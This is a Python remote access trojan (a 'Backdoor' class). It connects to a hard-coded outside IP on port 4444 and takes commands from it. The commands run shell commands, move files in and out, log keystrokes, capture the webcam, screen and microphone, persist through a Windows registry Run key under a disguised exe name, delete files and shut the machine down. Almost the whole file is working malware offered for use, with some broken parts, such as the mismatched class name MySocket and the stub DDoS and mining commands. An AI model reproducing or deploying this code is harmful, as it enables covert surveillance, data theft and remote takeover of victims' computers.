import socket
import random
import subprocess
import time
import simplejson
import os
import base64
import keyboard
import pyautogui
import pyaudio
import speech_recognition as sr
import argparse
import tempfile
import queue
import sys
import sounddevice as sd
import soundfile as sf
import shutil
import requests
import glob
import pygame
from pygame import camera
from time import sleep


while True:
	try:
		class Backdoor:
			def __init__(self, ip, port):
				self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				self.my_connection.connect((ip,port))

			def Command_Execution(self, command):
				return subprocess.check_output(command, shell=True)
			def JSON_Gonder(self, data):
				json_data = simplejson.dumps(data)
				self.my_connection.send(json_data.encode("utf-8"))
			def JSON_Al(self):
				json_data = ""
				while True:
					try:
						json_data = json_data + self.my_connection.recv(2048).decode()
						return simplejson.loads(json_data)
					except ValueError:
						continue
			def Execute_CD_Command(self,directory):
				os.chdir(directory)
				return "Cd to " + directory
			def Get_File_Contents(self,path):
				with open(path,"rb") as my_file:
					return base64.b64encode(my_file.read())
			def Save_File(self,path,content):
				with open(path,"wb") as my_file:
					my_file.write(base64.b64decode(content))
					return "Download OK"
			def Start_Socket(self):
				while True:
					command = self.JSON_Al()
					try:
						if command[0] == "closebackdoor":
							try:
								os.remove("Sataset.txt")
								os.remove("screen.png")
							except:
								pass
							exit()
						elif command[0] == "botnet-DDOS":
							while True:
								sleep(0.001)
								print(command[1], "Injection Send {} Pocket !".format(random.randint(50,256)))
						elif command[0] == "write":
							try:
								writing_data = str(command[1])
								keyboard.write(writing_data)
								command_output = "Writing OK"
							except:
								pass
						elif command[0] == "webcamscreenshot":
							try:
								pygame.camera.init()
								camlist = pygame.camera.list_cameras()
								if camlist:
									cam = pygame.camera.Camera(camlist[0], (640, 480))
									cam.start()
									image = cam.get_image()
									pygame.image.save(image, "scr.jpg")
									cam.stop()
									command_output = self.Get_File_Contents(command[1])

							except:
								command_output = "No Camera"
						elif command[0] == "search":
							if command[1] == "now":
								data = glob.glob("*."+str(command[2]))
								command_output = data
							else:
								os.chdir(command[1])
								data = glob.glob("*."+str(command[2]))
								command_output = data
						elif command[0] == "locasion":
							try:
								endpoint = 'https://ipinfo.io/json'
								response = requests.get(endpoint, verify=True)
								data = response.json()
								command_output = data
							except:
								pass
						elif command[0] == "keylogger":
							def Keylogger(lenData=int(command[1])):
								liste = list()
								keyboard.on_release(lambda e: liste.append(e.name))

								times = 0
								while True:
									times += 1
									time.sleep(1)
									if len(liste) > int(lenData):
										with open("Sataset.txt", "w") as file:
											for i in liste:
												if i == "space":
													file.write(" ")
												elif i == "backspace" or i == "shift" or i == "alt" or i == "ctrl":
													continue
												else:
													file.write(i)
										break

									if times == 300:
										with open("Sataset.txt", "w") as file:
											for i in liste:
												if i == "space":
													file.write(" ")
												elif i == "backspace" or i == "shift" or i == "alt" or i == "ctrl":
													continue
												else:
													file.write(i)
										break

									if times == 301:
										break

							Keylogger()
							with open("Sataset.txt","r") as file:
								data = file.read()
								file.close()
							command_output = str(data)
							os.remove("Sataset.txt")
						elif command[0] == "blockkey":
							keyboard.block_key(command[1])
							command_output = "Block" + str(command[1]) + "Key OK"
						elif command[0] == "microphonesound":
							def int_or_str(text):
								try:
									return int(text)
								except ValueError:
									return text
							parser = argparse.ArgumentParser(add_help=False)
							parser.add_argument('-l', '--list-devices', action='store_true', help='Ses aygıtlarını listeler ve sona erer')
							args, remaining = parser.parse_known_args()

							if args.list_devices:
								print(sd.query_devices())
								parser.exit(0)

							parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter, parents=[parser])
							parser.add_argument('filename', nargs='?', metavar='FILENAME', help='Sesin kaydedileceği dosyanın adı')
							parser.add_argument('-d', '--device', type=int_or_str, help='input device(Ses aygıtının sayısal ID değeri veya adı)')
							parser.add_argument('-r', '--samplerate', type=int, help='Örnekleme oranı')
							parser.add_argument('-c', '--channels', type=int, default=1, help='Giriş kanallarının sayısı')
							parser.add_argument('-t', '--subtype', type=str, help='Ses dosyası alt türü(örneğin "PCM_24")')

							args = parser.parse_args(remaining)
							q = queue.Queue()

							def callback(indata, frames, time, status):
								if status:
									print(status, file=sys.stderr)
								q.put(indata.copy())
							try:
								if args.samplerate is None:
									device_info = sd.query_devices(args.device, 'input')
									args.samplerate = int(device_info['default_samplerate'])
								if args.filename is None:
									args.filename = 'kayıt.wav'

								with sf.SoundFile(args.filename, mode='w', samplerate=args.samplerate, channels=args.channels, subtype=args.subtype) as file:
									with sd.InputStream(samplerate=args.samplerate, device=args.device, channels=args.channels, callback=callback):
										times = 450
										while True:
											times -= 1
											file.write(q.get())
											if times == 0:
												break
								command_output = self.Get_File_Contents(command[1])
								os.remove("kayıt.wav")
							except KeyboardInterrupt:
								parser.exit(0)
							except Exception as e:
								parser.exit(type(e).__name__ + ': ' + str(e))
						elif command[0] == "microphonetext":
							r = sr.Recognizer()
							with sr.Microphone() as source:
								audio = r.listen(source)
								data = r.recognize_google(audio, language=command[1])
								command_output = data
						elif command[0] == "doublespacecd":
							sleep(0.10)
							doublecd = str(command[1]) + " " + str(command[2]) + " " + str(command[3])
							command_output = self.Execute_CD_Command(doublecd)
						elif command[0] == "doublespacerename":
							double_space = str(command[1]) + " " + str(command[2]) + " " + str(command[3])
							os.rename(double_space,command[4])
							command_output = "Double Space Rename OK"
						elif command[0] == "doublespaceremove":
							double_remove = str(command[1]) + " " + str(command[2]) + " " + str(command[3])
							os.remove(double_remove)
							command_output = "Double Space Remove OK"
						elif command[0] == "spacecd":
							sleep(0.10)
							space_cd = str(command[1]) + " " + str(command[2])
							command_output = self.Execute_CD_Command(space_cd)
						elif command[0] == "removespace":
							sleep(0.10)
							remove = str(command[1]) + " " + str(command[2])
							os.remove(remove)
							command_output = "Remove Space OK"
						elif command[0] == "renamespace":
							sleep(0.10)
							space = str(command[1]) + " " + str(command[2])
							os.rename(space,command[3])
							command_output = "Rename Space OK"
						elif command[0] == "rename":
							os.rename(command[1],command[2])
							command_output = "Rename OK"
						elif command[0] == "remove":
							sleep(0.10)
							os.remove(str(command[1]))
							command_output = "Remove OK"
						elif command[0] == "strojan":
							def ADD_TO_REGİSTRY():
								new_file = os.environ["appdata"] + "\\Microsoft" + "\\Windows" + "\\Start Menu" + "\\Programs" + "\\sysenginner.exe"
								if not os.path.exists(new_file):
									shutil.copyfile("Backdoor.exe",new_file)
									regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
									subprocess.call(regedit_command, shell=True)
							ADD_TO_REGİSTRY()
							command_output = "Strojan Injection OK"
						elif command[0] == "see":
							sleep(0.10)
							command_output = os.listdir()
						elif command[0] == "start":
							sleep(0.10)
							try:
								os.system(str(command[1]))
								command_output = command[1] + " Start OK"
							except:
								pass
						elif command[0] == "screenshot":
							pyautogui.screenshot("screen.png")
							command_output = self.Get_File_Contents(command[1])
							os.remove("screen.png")
						elif command[0] == "close":
							sleep(0.25)
							os.system("shutdown /s")
						elif command[0] == "minning":
							sleep(0.25)
							command_output = "ETH Hash Minning Started !"
						elif command[0] == "cd" and len(command) > 1:
							sleep(0.10)
							command_output = self.Execute_CD_Command(command[1])
						elif command[0] == "download":
							sleep(0.10)
							command_output = self.Get_File_Contents(command[1])
						elif command[0] == "upload":
							sleep(0.10)
							command_output = self.Save_File(command[1],command[2])
						elif command[0] == "screensize":
							sleep(0.10)
							command_output = pyautogui.size()
						elif command[0] == "click":
							ESKI_KORDINAT = pyautogui.position()
							YENİ_KORDINAT = pyautogui.locateOnScreen("locate.png")
							pyautogui.moveTo(YENİ_KORDINAT)
							pyautogui.click()
							pyautogui.moveTo(ESKI_KORDINAT)
							os.remove("locate.png")
							command_output = "Click OK"
						else:
							command_output = self.Command_Execution(command)

					except Exception:
						command_output = "Error!"


					self.JSON_Gonder(command_output)
				self.my_connection.close()

		my_socket_object = MySocket("95.12.78.161",4444)
		my_socket_object.Start_Socket()

	except:
		print("Try Again Connection !")



